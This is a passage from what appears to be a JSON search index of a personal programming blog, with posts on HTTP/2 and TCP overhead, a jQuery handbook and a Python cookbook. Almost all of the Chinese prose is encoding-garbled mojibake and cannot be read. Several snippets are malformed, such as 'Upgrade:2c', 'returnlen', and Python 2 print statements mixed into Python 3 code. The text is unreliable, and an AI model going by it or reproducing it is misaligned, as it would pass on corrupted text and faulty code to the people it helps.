2.2 h2è¿‡ç¨‹h2ä¼ è¾“çš„æ˜¯Binary Frameï¼Œè¿™é‡Œé¢åŒ…æ‹¬HEADER FRAMEå’ŒDATA FRAME, requestçš„bodyå’Œresponseçš„bodyéƒ½é€šè¿‡DATA FRAMEä¼ è¾“ã€‚clientå‘èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œheaderé‡Œé¢åŒ…æ‹¬(Upgrade:2c),ä¸€åˆ‡OKçš„è¯ï¼ŒæœåŠ¡å™¨è¿”å›ä¸€ä¸ªstatus code 101(switching Protocol)ã€‚åœ¨response headeré‡Œé¢è¿”å›ä¸€ä¸ªUpgrade: h2cã€‚ 2.3 TLS ,SSLç”¨äºä¸¤ç‚¹é—´ä¼ è¾“binaryæ•°æ®TLS(Transport Layer Security),SSL(Secure Sockets Layer)ALPN(Application Level Protcol Negotitation) 2.4 æ•°æ®ä¼ è¾“çš„æ¨¡å‹h2åªæœ‰ä¸€æ¡connectionï¼Œé‡Œé¢æœ‰å¤šä¸ªSTREAMï¼ŒSTREAMé‡Œé¢åŒ…æ‹¬äº†Requestçš„HEADER FRAMEå’ŒDATA FRAMEä»¥åŠResponseçš„HEADER FRAMEå’ŒDATA FRAMEã€‚FRAMEé‡Œé¢æœ‰length,Typeï¼ŒFlags,ID(æœ‰äº†IDå°±èƒ½æœ‰sequence,ä¹Ÿå°±èƒ½multiplexingï¼Œå¤šè·¯å¤ç”¨)ä»¥åŠPayload(æ•°æ®)ã€‚FRAME TYPEæœ‰å¾ˆå¤šç§ï¼ŒDATA,HEADER,WINDOW_UPDATE,SETTINGï¼ŒGOAWAY,è¿™äº›åœ¨okhttpé‡Œé¢éƒ½èƒ½çœ‹åˆ°.ç”¨WireSharkå¯ä»¥æŸ¥çœ‹h2ä¸ºä»€ä¹ˆå¿«ï¼ŒMultiplexingï¼Œå¤šè·¯å¤ç”¨å…è®¸åŒæ—¶é€šè¿‡å•ä¸€çš„ HTTP/2 è¿æ¥å‘èµ·å¤šé‡çš„è¯·æ±‚-å“åº”æ¶ˆæ¯ 2.5 Header Compressionæœ¬æ¥GZipæ˜¯ä¸èƒ½å‹ç¼©Headerçš„ï¼Œh2ä½¿ç”¨HPACK(å¾ˆå¤æ‚çš„åè®®)ï¼Œè®²header(æ— éæ˜¯é”®å€¼å¯¹)ä¸­çš„key,valueæ˜ å°„ä¸€ä»½è¡¨ï¼Œæ‰€ä»¥æ¯ä¸€æ¬¡å‘èµ·è¯·æ±‚ï¼Œh2ä¼šå°†é‚£äº›headerå˜æˆæ•°å­—ï¼ŒåŒæ—¶ï¼Œåªä¼šå‘é€æ”¹å˜äº†çš„headerã€‚ï¼ˆåº”ç”¨å±‚æ— éœ€å…³å¿ƒï¼Œååˆ†å¤æ‚ï¼‰ 2.6 Streamså¯ä»¥è®¾ç½®ä¼˜å…ˆçº§éƒ½æ˜¯åœ¨ä¸€æ¡Connectionä¸­å‘é€å‡ºå»ï¼Œå¼€å‘è€…å¯ä»¥è®¾ç½®ï¼Œä¾‹å¦‚ï¼Œjsä¼˜å…ˆçº§é«˜ç‚¹ï¼Œimageä¼˜å…ˆçº§ä½ä¸€ç‚¹ã€‚ 2.7 Flow Control Multiplexing requires ability of flow control WINDOW_UPDATE 2.8 Server Pushå®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªç½‘é¡µå¦‚ index.htmlï¼ŒæœåŠ¡å™¨ä¼šè§‰å¾—ï¼Œå®¢æˆ·ç«¯å¾ˆæœ‰å¯èƒ½è¿˜æƒ³è¦style.csså’Œscript.jsã€‚äºæ˜¯é¡ºå¸¦ç€ä¹Ÿç»™ä¸¢è¿‡æ¥äº†ã€‚server pushå¤§è‡´å¦‚æ­¤ã€‚è¿™æ ·çš„å¥½å¤„å°±æ˜¯ï¼Œclientæ— éœ€å‘èµ·è¯·æ±‚ï¼Œçœäº†æµé‡ã€‚åŒæ—¶ï¼Œclientè¿˜å¯ä»¥è¯´GO_AWAY,ä¹Ÿå°±æ˜¯æ‹’ç»SERVERçš„pushã€‚ 3.ç°çŠ¶ç°åœ¨å¾ˆå¤šç½‘ç«™å·²ç»æ”¯æŒäº†h2ï¼Œtwitterå¥½åƒå°±æ˜¯ã€‚ä¸€ä¸ªå¾ˆç®€å•çš„æ–¹æ³•å°±æ˜¯çœ‹chromeé‡Œé¢çš„networkï¼Œh2åªæœ‰ä¸€æ¡çº¿ã€‚æœåŠ¡å™¨è¿™è¾¹ï¼ŒNgnix 1.9.5æ”¯æŒh2ï¼ŒApache 2.4.12å¼€å§‹æ”¯æŒå®¢æˆ·ç«¯è¿™è¾¹ Netty,OkHttp,Curl éƒ½è¡Œè¿›å…¥h2ï¼Œdomain sharding,Concatenation and Spriting,InLiningè¿™äº›techniqueséƒ½æ²¡æœ‰æ„ä¹‰äº†ã€‚ æ¼”ç¤º Update With 100Mbit/s Ethernet, a large file transfers at 94.1Mbit/s. Thatâ€™s 6% overhead.æ‰€ä»¥æœ¬åœ°è®°å½•çš„ä¸‹è½½åˆ°çš„æ–‡ä»¶çš„é€Ÿåº¦è¦æ¯”è¿è¥å•†æŠ¥å‘Šçš„å®é™…å¸¦å®½å°ä¸€ç‚¹ï¼Œå½“ç„¶è¿™åªæ˜¯ä¸€éƒ¨åˆ†åŸå› ã€‚ çœ‹çœ‹ä¸€ä¸ªTCPåŒ…é™¤äº†æ•°æ®ä¹‹å¤–è¿˜å¡äº†å†™å“ªäº›bookKeepingçš„ä¸œè¥¿å½“Â·Â·Â·æ—¶å‘ç”Ÿäº†ä»€ä¹ˆä½¿ç”¨å¥—æ¥å­—å½“æµè§ˆå™¨å¾—åˆ°äº†ç›®æ ‡æœåŠ¡å™¨çš„ IP åœ°å€ï¼Œä»¥åŠ URL ä¸­ç»™å‡ºæ¥ç«¯å£å·ï¼ˆhttp åè®®é»˜è®¤ç«¯å£å·æ˜¯ 80ï¼Œ https é»˜è®¤ç«¯å£å·æ˜¯ 443ï¼‰ï¼Œå®ƒä¼šè°ƒç”¨ç³»ç»Ÿåº“å‡½æ•° socket ï¼Œè¯·æ±‚ä¸€ä¸ª TCPæµå¥—æ¥å­—ï¼Œå¯¹åº”çš„å‚æ•°æ˜¯ AF_INET/AF_INET6 å’Œ SOCK_STREAM ã€‚ è¿™ä¸ªè¯·æ±‚é¦–å…ˆè¢«äº¤ç»™ä¼ è¾“å±‚ï¼Œåœ¨ä¼ è¾“å±‚è¯·æ±‚è¢«å°è£…æˆ TCP segmentã€‚ç›®æ ‡ç«¯å£ä¼šè¢«åŠ å…¥å¤´éƒ¨ï¼Œæºç«¯å£ä¼šåœ¨ç³»ç»Ÿå†…æ ¸çš„åŠ¨æ€ç«¯å£èŒƒå›´å†…é€‰å–ï¼ˆLinuxä¸‹æ˜¯ip_local_port_range)TCP segment è¢«é€å¾€ç½‘ç»œå±‚ï¼Œç½‘ç»œå±‚ä¼šåœ¨å…¶ä¸­å†åŠ å…¥ä¸€ä¸ª IP å¤´éƒ¨ï¼Œé‡Œé¢åŒ…å«äº†ç›®æ ‡æœåŠ¡å™¨çš„IPåœ°å€ä»¥åŠæœ¬æœºçš„IPåœ°å€ï¼ŒæŠŠå®ƒå°è£…æˆä¸€ä¸ªIP packetã€‚è¿™ä¸ª TCP packet æ¥ä¸‹æ¥ä¼šè¿›å…¥é“¾è·¯å±‚ï¼Œé“¾è·¯å±‚ä¼šåœ¨å°åŒ…ä¸­åŠ å…¥ frame å¤´éƒ¨ï¼Œé‡Œé¢åŒ…å«äº†æœ¬åœ°å†…ç½®ç½‘å¡çš„MACåœ°å€ä»¥åŠç½‘å…³ï¼ˆæœ¬åœ°è·¯ç”±å™¨ï¼‰çš„ MAC åœ°å€ã€‚åƒå‰é¢è¯´çš„ä¸€æ ·ï¼Œå¦‚æœå†…æ ¸ä¸çŸ¥é“ç½‘å…³çš„ MAC åœ°å€ï¼Œå®ƒå¿…é¡»è¿›è¡Œ ARP å¹¿æ’­æ¥æŸ¥è¯¢å…¶åœ°å€ã€‚åˆ°äº†ç°åœ¨ï¼ŒTCP å°åŒ…å·²ç»å‡†å¤‡å¥½äº†ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹å¼è¿›è¡Œä¼ è¾“ï¼š nagleç®—æ³•åŠå½±å“ å‡è®¾è¦é€šè¿‡httpå‘é€hello, worldè¿™12ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯å®é™…ä¸Šè¦å‘é€å¤šå°‘ä¸ªå­—èŠ‚å‘¢ï¼Ÿå¦‚ä¸‹ï¼š 16å­—èŠ‚çš„æ•°æ®å¸§å¤´+ 20å­—èŠ‚çš„ipå¤´ + 20å­—èŠ‚çš„tcpå¤´+ 288å­—èŠ‚çš„httpå¤´ + 12å­—èŠ‚æ–‡æœ¬ ä¹Ÿå°±æ˜¯è¯´ä¸ºäº†å‘é€12ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œæ€»å…±å¾—å‘é€356ä¸ªå­—èŠ‚ï¼Œæœ‰æ•ˆå†…å®¹ä»…å äº†4%ä¸åˆ°ã€‚ å‚è€ƒ what-of-traffic-is-network-overhead-on-top-of-http-s-requests Hadi Hariri â€” HTTP/2 â€“ What do I need to know? WEBåŠ é€Ÿï¼Œåè®®å…ˆè¡Œè…¾è®¯æŠ€æœ¯å·¥ç¨‹äº‹ä¸šç¾¤åŸºç¡€æ¶æ„éƒ¨é«˜çº§å·¥ç¨‹å¸ˆlancelotæ¼”è®² HTTP 2.0: why and how by Simone Bordet HTTP1.1ä¸­çš„ä¸€äº›ä¼˜åŒ–ç­–ç•¥å¤±æ•ˆ Oâ€™Reilly HTTP/2 Flow control http3 based on quic æµè§ˆå™¨å¯¹åŒä¸€ipè¿›è¡Œè¯·æ±‚çš„æœ€å¤§å¹¶å‘è¿æ¥æ•°æ˜¯ä¸ä¸€æ ·çš„ï¼šIE11 ã€IE10 ã€chromeã€Firefox çš„å¹¶å‘è¿æ¥æ•°æ˜¯ 6ä¸ªï¼ŒIE9æ˜¯10ä¸ªã€‚ã€‚","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"jQueryæ‰‹å†Œ","date":"2017-08-27T21:48:52.000Z","path":"2017/08/27/2017-08-27-jquery-stuff/","text":"jQueryæ˜¯ä¸€ä¸ªdom manipulate libraryï¼Œéå¸¸å¤§ã€‚jQueryèƒ½å¹²çš„äº‹æƒ…åŒ…æ‹¬ï¼š html çš„å…ƒç´ é€‰å– htmlçš„å…ƒç´ æ“ä½œ html doméå†å’Œä¿®æ”¹ jsç‰¹æ•ˆå’ŒåŠ¨ç”»æ•ˆæœ cssæ“ä½œ htmläº‹ä»¶æ“ä½œ ajaxå¼‚æ­¥è¯·æ±‚æ–¹å¼,etc 1.å®‰è£…1.1 ä½¿ç”¨å¾®è½¯æˆ–è€…è°·æ­Œçš„CDN,æ”¾åœ¨head tagé‡Œé¢è¿™æ ·åšçš„å¥½å¤„æ˜¯åˆ«çš„ç½‘ç«™å·²ç»åŠ è½½è¿‡çš„jsæ–‡ä»¶å¯ä»¥ç›´æ¥è¯»ç¼“å­˜ï¼ŒåŠ å¿«åŠ è½½é€Ÿåº¦å…¶å®è‡ªå·±ä¸‹è½½ä¸€ä»½ï¼Œç”¨srcå¼•ç”¨ä¹Ÿè¡Œ &lt;head&gt; &lt;script src=&quot;http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js&quot;&gt; &lt;/script&gt; &lt;/head&gt; è¿™ä¸€æ®µå¿…é¡»æ”¾åœ¨headé‡Œé¢ï¼Œç”¨è‡ªå·±çš„srcæˆ–è€…å¾®è½¯ï¼Œè°·æ­Œçš„cdnéƒ½å¯ä»¥ã€‚å¦‚æœè‡ªå·±çš„jsæ–‡ä»¶å¼•ç”¨åˆ°äº†jQueryï¼Œéœ€è¦æŠŠjQueryå†™åœ¨å…¶ä»–jså‰é¢ è¿™ä¹‹åï¼Œåœ¨consoleä¸­è¾“å…¥ window.jQueryÆ’ (a,b){return new r.fn.init(a,b)} æ˜¾ç„¶æ˜¯å·²ç»æ³¨å†Œäº†å…¨å±€å¸¸é‡ 2. ä½¿ç”¨npmå’Œexpress yarn add jquery express ç„¶ååœ¨app.jsä¸­ app.use(&#39;/jquery&#39;, express.static(__dirname + &#39;/node_modules/jquery/dist/&#39;)); åœ¨htmlé‡Œ &lt;script src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; 1.1æ‰€æœ‰çš„jQueryå‡½æ•°éƒ½æ”¾åœ¨readyé‡Œé¢è¿™ä¸€æ®µscriptæ”¾åœ¨bodyåé¢ä¹Ÿè¡Œï¼Œæ”¾åœ¨headé‡Œé¢ä¹Ÿè¡Œ $(document).ready(function(){ --- jQuery functions go here ---- }); åŸºæœ¬ä¸Šå°±æ˜¯windowæ¸²æŸ“å®Œæ¯•ä¹‹åå¼€å§‹åšä¸€äº›äº‹æƒ…ï¼Œéšä¾¿æŠ„äº†ä¸€æ®µçŸ¥ä¹é¦–é¡µçš„Buttonè¿™é‡Œé¢åŒå¼•å·(â€œâ€)å’Œå•å¼•å·(â€˜â€™)éƒ½è¡Œ $(&#39;button#button1&#39;).css(&quot;background-color&quot;,&quot;#0f88eb&quot;) .css(&#39;border-radius&#39;,&#39;8px&#39;).css(&#39;padding-right&#39;,&#39;14px&#39;) .css(&#39;padding-left&#39;,&#39;14px&#39;).css(&#39;color&#39;,&#39;white&#39;) .css(&#39;line-height&#39;,&#39;30px&#39;) å‰ææ˜¯bodyé‡Œé¢æ”¾äº†ä¸€ä¸ªclass = button1 çš„button tag.è¿™é‡Œåªæ˜¯æ”¹å˜äº†æŒ‰é’®çš„cssæ ·å¼ï¼ŒjQueryé€‰æ‹©å™¨æœ‰ä¸€äº›è§„åˆ™éœ€è¦è®°ä½ï¼Œä¸»è¦å°±æ˜¯å¦‚ä½•é€‰æ‹©htmlä¸­çš„å…ƒç´  $(this)è¡¨ç¤ºå½“å‰htmlå¯¹è±¡ $(â€˜pâ€™)è¡¨ç¤ºæ‰€ä»¥æ ‡ç­¾ $(â€˜p.introâ€™)è¡¨ç¤ºæ‰€æœ‰classä¸ºintroçš„æ ‡ç­¾ $(â€˜.introâ€™)è¡¨ç¤ºæ‰€æœ‰classä¸ºintroçš„æ ‡ç­¾ $(â€˜#introâ€™)è¡¨ç¤ºæ‰€æœ‰idä¸ºintroçš„å…ƒç´  $ï¼ˆâ€™div#intro.headâ€™) æ‰€æœ‰id= â€˜introâ€™çš„divä¸­ï¼Œæ‰¾åˆ°classä¸ºâ€™headâ€™çš„å…ƒç´  1.2 å¸¸ç”¨å‡½æ•°åœ¨script tagé‡Œé¢æ·»åŠ è¿™ä¸€æ®µï¼Œå› ä¸ºæ¯”å¯¹æ¡†æ¶å¯èƒ½ä½¿ç”¨äº†$ç¬¦å·ï¼Œä¸ºé¿å…å†²çªï¼Œç”¨varæ›¿ä»£$ç¬¦å· var jq=jQuery.noConflict()ï¼Œ 1.3 selectoræ€ä¹ˆå†™å†™ä¸€ä¸ªtagï¼Œåé¢è¦ä¹ˆå†™id=â€™â€™ï¼Œè¦ä¹ˆå†™class = â€˜â€™ï¼Œidè¦ç”¨â€#â€æŸ¥æ‰¾ï¼Œclassè¦ç”¨â€™.â€™æŸ¥æ‰¾ã€‚æ‰€ä»¥ æ–‡å­— è¿™ç§idæ˜¯ä¸ä¼šæœ‰å“åº”çš„ 1.4 è¿˜å¯ä»¥åŠ äº‹ä»¶å›è°ƒå¯ä»¥åœ¨äº‹ä»¶åé¢åŠ å›è°ƒï¼Œä¾‹å¦‚ jq(&#39;.click_btn&#39;).slideUp(300) //å¯ä»¥è®¤ä¸ºç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªfunction jq(&#39;.click_btn&#39;).slideUp(300,function { alert(&#39;this will invoke after slideup finished&#39;) }) å¯ä»¥è‡ªå·±å†™å‡½æ•°ï¼Œå¯ä»¥å¼•ç”¨ä¹‹å‰å®šä¹‰çš„å‡½æ•°ã€‚å½“ç„¶å‡½æ•°å›è°ƒé‡Œé¢è¿˜å¯ä»¥åŠ å›è°ƒï¼Œå½“ç„¶ä¼šæœ‰callback hellã€‚ç®€å•çš„è§£å†³æ–¹å¼ï¼ŒæŠŠä½œä¸ºç¬¬äºŒä¸ªå‚æ•°çš„å‡½æ•°æå–æˆä¸€ä¸ªå‡½æ•°ï¼Œå¼•ç”¨å‡½æ•°åä½œä¸ºå‚æ•°ä¼ è¿›å»å°±å¥½äº†ã€‚å¦å¤–ï¼Œåœ¨jsé‡Œé¢var myFunction = function(){//stuff }æ˜¯å®Œå…¨æˆç«‹çš„ï¼Œå‡½æ•°ä¹Ÿæ˜¯varã€‚ Todo å»å¤åˆ¶ä¸€å¤§å †æ–‡å­—ï¼Œbuttonï¼Œimgçš„cssæ ·å¼ï¼Œä¿®æ”¹ï¼Œç»§æ‰¿ï¼Œå¼•ç”¨ã€‚æ‰‹å†™å®åœ¨å¤ªæ…¢ jQueryæ’ä»¶ fx queue TakeAway jQueryå¿…é¡»å†™åœ¨æœ€å‰é¢ï¼Œå¦‚æœç½‘é¡µä¸­è¿˜æœ‰å…¶ä»–çš„jså¼•ç”¨åˆ°äº†jQueryçš„è¯","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"jQuery","slug":"jQuery","permalink":"https://haldir65.github.io/tags/jQuery/"},{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"}]},{"title":"Pythonå·¥å…·æ‰‹å†Œ","date":"2017-08-24T22:25:18.000Z","path":"2017/08/24/2017-08-24-python-cookbook/","text":"è‹¦æµ·æ— æ¶¯ï¼ŒPythonæ˜¯å²¸ 1. åŸºæœ¬æ•°æ®æ“ä½œï¼ŒåŠè¯­æ³• å‡½æ•°å‚æ•°é»˜è®¤å‚æ•°ã€å¯å˜å‚æ•°ã€å…³é”®å­—å‚æ•°ç­‰ é›†åˆç±»å‹(listæ˜¯ä¸­æ‹¬å·ï¼Œtupleæ˜¯å°æ‹¬å·) unicodeError é¢å‘å¯¹è±¡ å¤šçº¿ç¨‹ï¼Œå¤šè¿›ç¨‹å¤šçº¿ç¨‹åŸºæœ¬æ— ç”¨ï¼ŒåŸºæœ¬è¯­æ³•å¾ˆç®€å•ï¼š`pythonimport threading def readIo() print(â€˜do stuff heavyâ€™) for i in range(10): threading.Thread(target=readIo).start()print(â€˜Finishing upâ€™) ## 2. Flaskç›¸å…³ ### 2.1 Flask Admin Pannel[Flask-Adminä¸­æ–‡å…¥é—¨æ•™ç¨‹](http://flask123.sinaapp.com/article/57/)Please run on linux ### 2.2.logä¸Šé¢œè‰² [åšå®¢](https://blog.phpgao.com/python_colorful_log.html)ï¼ŒPycharmçš„consoleæ— æ•ˆï¼Œå†…ç½®Terminalæœ‰æ•ˆ ### 2.7 [å°Web](http://www.jianshu.com/p/f9d668490bc6) dictçš„åˆ›å»ºæ–¹æ³•[å‚è€ƒ](https://www.linuxzen.com/python-you-ya-de-cao-zuo-zi-dian.html) ```python &gt;&gt;&gt; info = {&quot;name&quot; : &#39;cold&#39;} &gt;&gt;&gt; info = dict(name = &#39;cold&#39;) # æ›´ä¼˜é›…,æ³¨æ„è¿™é‡Œçš„keyä¸éœ€è¦å¸¦åŒå¼•å·äº† æ“ä½œæ•°æ®åº“çš„è¯ï¼Œåœ¨pythonæ–‡ä»¶é‡Œé¢å†™sqlè¯­å¥ä¹Ÿè¡Œã€‚sqlite3è¿˜æ˜¯å®˜æ–¹è‡ªå¸¦åŒ…ï¼Œmysqlè¦è£…ä¸ªåŒ…ã€‚ä½†æ˜¯å®é™…å¼€å‘ä¸­åº”è¯¥å¤§å¤šæ•°éƒ½ä½¿ç”¨ormæ¡†æ¶ï¼Œå¾ˆå°‘ä¼šè‡ªå·±å»å†™sqlè¯­å¥å§. orm(object relation mapping)æ¡†æ¶ï¼š sqlalchemy pip install sqlalchemy python cheetsheet 2 .sys.args[]çš„ä½¿ç”¨ï¼Œè¯»å–ç”¨æˆ·è¾“å…¥cmdä¸­ python Python 3.6.1 (v3.6.1:69c0db5, Mar 21 2017, 17:54:52) [MSC v.1900 32 bit (Intel)] on win32Type â€œhelpâ€, â€œcopyrightâ€, â€œcreditsâ€ or â€œlicenseâ€ for more information. é€€å‡ºæ–¹å¼ ctrl+Z åˆ‡æ¢åˆ°è„šæœ¬æ‰€åœ¨ç›®å½• ,ä¾‹å¦‚test.py #!/usr/bin/env python3 # -*- coding: utf-8 -*- import sys # sys.argvæ¥æ”¶å‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°å¼€å§‹æ˜¯ç”¨æˆ·è¾“å…¥çš„å‚æ•°ï¼Œä»¥ç©ºæ ¼éš”å¼€ # cmdåˆ°è¯¥æ–‡ä»¶ä½ç½® def run1(): print(&#39;I\\&#39;m action1&#39;) def run2(): print(&#39;I\\&#39;m action2&#39;) if 2 &gt; len(sys.argv): print(&#39;none&#39;) else: action1 = sys.argv[0] action2 = sys.argv[1] if &#39;run1&#39; == action1: run1() if &#39;run2&#39; == action2: run2() print(action1) print(action2) è¾“å…¥ python test.py run1è¾“å‡º test.py â€˜run1â€™ 2.3 Pycharmé‡Œé¢importå„ç§canâ€™t resolve çš„è§£å†³æ–¹æ³• from werkzeug import secure_filename from werkzeug.utils import secure_filenameåªæ˜¯å› ä¸ºè¿™ä¸ªæ–‡ä»¶çš„åŒ…çš„ä½ç½®æŒªäº†ï¼Œimportåªèƒ½ç”¨ç»å¯¹è·¯å¾„ åœ¨classä¸­è°ƒç”¨parent classçš„æ–¹æ³• class Grandparent(object): def my_method(self): print &quot;Grandparent&quot; class Parent(Grandparent): def my_method(self): print &quot;Parent&quot; class Child(Parent): def my_method(self): print &quot;Hello Grandparent&quot; super(Parent, self).my_method() 3. Error Handlingtry exceptæ˜¯å¯ä»¥æ‹¿åˆ°exceptionçš„åŸå› çš„ try: 1 + &#39;1&#39; f = open(&#39;è¯¥æ–‡æ¡£ä¸å­˜åœ¨&#39;) print(f.read()) f.close() except OSError as reason: print(&#39;æ–‡ä»¶å‡ºé”™äº†T_T&#39;) print(&#39;å‡ºé”™åŸå› æ˜¯%s&#39;%str(reason)) except TypeError as reason: print(&#39;æ±‚å’Œå‡ºé”™äº†T_T&#39;) print(&#39;å‡ºé”™åŸå› æ˜¯%s&#39;%str(reason)) æ—¶é—´çš„å‡½æ•°æœ‰datetimeå’ŒtimeåŒ…datetimeåœ¨windowsä¸Šå’Œåœ¨macä¸Šæœ‰è¡¨ç°ä¸ä¸€è‡´çš„ç°è±¡python-time-formatting-different-in-windowsäº²æµ‹ä¸‹æ¥, import datetime dt = datetime.datetime.now() expire_time = dt.strftime(&#39;%s&#39;) ## äº²æµ‹ï¼Œmacä¸Šæ²¡é—®é¢˜,windowsä¸Šä¼šå´©,æŠŠsæ”¹æˆSå°±ä¸ä¼šåœ¨windowsä¸Šå´©äº†ã€‚ ## åæ¥å¹²è„†æ”¹æˆè¿™æ · expire = int(round(dt.timestamp())) æ—¶é—´ç›¸å…³çš„æ“ä½œåœ¨è¿™é‡Œï¼š import datetime datetime.now().strftime(&quot;%Yå¹´-%mæœˆ-%dæ—¥ %H %m %S&quot;) ## &#39;2018å¹´-07æœˆ-03æ—¥ 11 07 34&#39; ### æ˜å¤© tomorrow = datetime.date.today() + datetime.timedelta(days=1) ## è¦æ˜¯ä¼ ä¸ª-1å°±æ˜¯æ˜¨å¤©äº† ## è¿™ä¸ªè·å–çš„æ˜¯ä¸€ä¸ªdatetime.dateå¯¹è±¡ ## æ¥çœ‹çœ‹è¿™ä¸ªdatatime.dateå¯¹è±¡èƒ½å¹²å˜›å§ tomorrow.year ##2018 tomorrow.day #4 tomorrow.ctime() ## &#39;Wed Jul 4 00:00:00 2018&#39; &gt;&gt;&gt; tomorrow.isoformat() &#39;2018-07-04&#39; å¦‚ä½•åˆ›å»ºä¸€ä¸ªdatetime.dateå¯¹è±¡ï¼š &gt;&gt;&gt; someday = datetime.datetime(2015,7,23,0,0) &gt;&gt;&gt; someday datetime.datetime(2015, 7, 23, 0, 0) &gt;&gt;&gt; someday.day 23 &gt;&gt;&gt; someday.month 7 &gt;&gt;&gt; someday.year 2015 ä»Šå¤©æ˜¯å‘¨å‡ å•Š &gt;&gt;&gt; someday.isoweekday() 4 ##å‘¨å››ï¼Œçœ‹äº†ä¸‹æ—¥å†ï¼Œç¡®å®æ˜¯å‘¨å›› someday = datetime.datetime.strptime(&quot;2015-10-1 18:20:31&quot;,&quot;%Y-%m-%d %H:%M:%S&quot;) &gt;&gt;&gt; someday datetime.datetime(2015, 10, 1, 18, 20, 31) ##timetupleçš„æ¦‚å¿µ &gt;&gt;&gt; someday.timetuple() time.struct_time(tm_year=2015, tm_mon=10, tm_mday=1, tm_hour=18, tm_min=20, tm_sec=31, tm_wday=3, tm_yday=274, tm_isdst=-1) ## è¿™ä¸ªstructä¹Ÿæ˜¯èƒ½ç”¨çš„ &gt;&gt;&gt; someday.timetuple().tm_year 2015 ## çº¯ç²¹æƒ³è¦è·å¾—æ—¶é—´æˆ³å¯ä»¥ç”¨è¿™ä¸ª import time &gt;&gt;&gt; time.time() 1530587669.796551 ##æ³¨æ„è¿™ä¸ªè·å¾—çš„æ˜¯ç§’ä¸ºå•ä½çš„ ##è¿™ç§æ–¹å¼ä¹Ÿèƒ½è·å¾—æ—¶é—´æˆ³ &gt;&gt;&gt; timestamp = time.mktime(datetime.datetime.now().timetuple()) &gt;&gt;&gt; timestamp 1530588755.0 ##æœ‰äº†æ—¶é—´æˆ³æƒ³è¦è½¬å›object: &gt;&gt;&gt;time.gmtime(timestamp) time.struct_time(tm_year=2018, tm_mon=7, tm_mday=3, tm_hour=3, tm_min=32, tm_sec=55, tm_wday=1, tm_yday=184, tm_isdst=0) ##fromtimestampä¹Ÿè¡Œ &gt;&gt;&gt; datetime.datetime.fromtimestamp(time.time()) datetime.datetime(2018, 7, 3, 11, 36, 53, 58164) ## ç„¶è€ŒdatetimeåŒ…ä¸‹é¢è¿˜æœ‰ä¸€ä¸ª &gt;&gt;&gt; datetime.time &lt;class &#39;datetime.time&#39;&gt; &gt;&gt;&gt; from datetime import datetime print(datetime.now()) 2018-07-11 17:47:01.109458 &gt;&gt;&gt; print(datetime.utcnow()) 2018-07-11 09:47:09.212414 è‡ªå¸¦çš„Logä½¿ç”¨, æ³¨æ„é»˜è®¤çš„æƒ…å†µä¸‹æ˜¯ä¸æ‰“å°å‡ºinfoçš„ä¿¡æ¯çš„ï¼Œéœ€è¦è®¾ç½®ä¸€ä¸‹level(é»˜è®¤çš„æ˜¯WARNING) import logging # create logger logging.basicConfig(level=logging.DEBUG, format=&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;) logger = logging.getLogger(__name__) # ä¸‹é¢è¿™ä¸¤æ®µä¹Ÿå¯ä»¥ # logging.basicConfig() # logging.getLogger().setLevel(logging.DEBUG) def main(): logger.info(&#39;This is a log info&#39;) logger.debug(&#39;Debugging&#39;) logger.warning(&#39;Warning exists&#39;) logger.info(&#39;Finish&#39;) pass if __name__ == &quot;__main__&quot;: main() ä¸‹åˆ’çº¿çš„æ„ä¹‰å¾ˆå¤šç§è¿™å…¶ä¸­å°±åŒ…å«äº†magic_methodï¼Œæˆ–è€…dunder class. ç›´æ¥çœ‹å§ã€‚ ## ä¸€èˆ¬__init__æ˜¯å†™ä¸€ä¸ªclassæ—¶ç»å¸¸ç”¨åˆ°çš„æ–¹æ³•ï¼Œä½†å…¶å®è¿˜æœ‰ä¸€ä¸ª__new__çš„æ–¹æ³• ## å½“è°ƒç”¨x = SomeClass()çš„æ—¶å€™ï¼Œ__init__å¹¶ä¸æ˜¯ç¬¬ä¸€ä¸ªè¢«è°ƒç”¨çš„æ–¹æ³•ï¼Œå®é™…ä¸Šè¿˜æœ‰ä¸€ä¸ª ## __new__æ–¹æ³•ï¼Œ__new__æ–¹æ³•æ˜¯ç”¨æ¥åˆ›å»ºç±»ç—…è¿”å›è¿™ä¸ªç±»çš„å®ä¾‹ï¼Œè€Œ__init__åªæ˜¯æ‹¿ç€ä¼ å…¥çš„å‚æ•°æ¥åˆå§‹åŒ–è¿™ä¸ªå®ä¾‹ http://python.jobbole.com/88367/ ##åœ¨å¯¹è±¡ç”Ÿå‘½å‘¨æœŸè°ƒç”¨ç»“æŸæ—¶ï¼Œ__del__ æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œå¯ä»¥åœ¨è¿™é‡Œé‡Šæ”¾èµ„æº class MyDict(object): def __init__(self): print&#39;call fun __init__&#39; self.item = {} def __getitem__(self,key): print&#39;call fun __getItem__&#39; return self.item.get(key) def __setitem__(self,key,value): print&#39;call fun __setItem__&#39; self.item[key] =value def __delitem__(self,key): print&#39;cal fun __delitem__&#39; del self.item[key] def __len__(self): returnlen(self.item) ä¸Šé¢è¿™äº›ä¸»è¦æ˜¯åˆ›å»ºç±»ä¼¼äºdictæˆ–è€…æ˜ å°„çš„ç±»ï¼Œå¯ä»¥åƒæ“ä½œå­—å…¸ä¸€æ ·è¿›è¡Œä½¿ç”¨ myDict = MyDict() myDict[2] = &#39;ch&#39; ##ä¼šè°ƒç”¨åˆ°__setitem__æ–¹æ³• del myDict[2] ##ä¼šè°ƒç”¨åˆ°__delitemæ–¹æ³•ï¼Œå…¶å®ä¹Ÿç­‰äºå¯¹å¤–æä¾›äº†ä¸€ä¸ªé’©å­ __getattr__(self, name)ï¼š ## 